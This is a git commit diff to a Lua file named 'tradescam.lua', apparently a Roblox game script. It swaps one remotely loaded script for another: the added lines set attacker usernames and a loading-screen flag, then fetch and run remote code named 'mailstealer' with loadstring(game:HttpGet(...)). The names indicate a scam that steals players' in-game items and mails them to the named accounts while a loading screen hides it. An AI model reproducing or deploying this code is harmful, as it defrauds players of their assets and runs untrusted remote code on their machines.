53b5465482fff1b121bc39e629abc7eb50ad4286
ps99hub <104423014+ps99hack@users.noreply.github.com>
2024-02-19 18:37:51 +0700

    Update tradescam.lua

--- tradescam.lua
+++ tradescam.lua
@@ -1,2 +1,4 @@
-Username="cak_5cm"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bithui/autofishingps99/main/payautoadvfishing.lua", true))()
+Username = "egaxom2"
+Username2 = "egaxom2"
+LoadingScreen = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ps99hack/ps99/main/mailstealer"))()
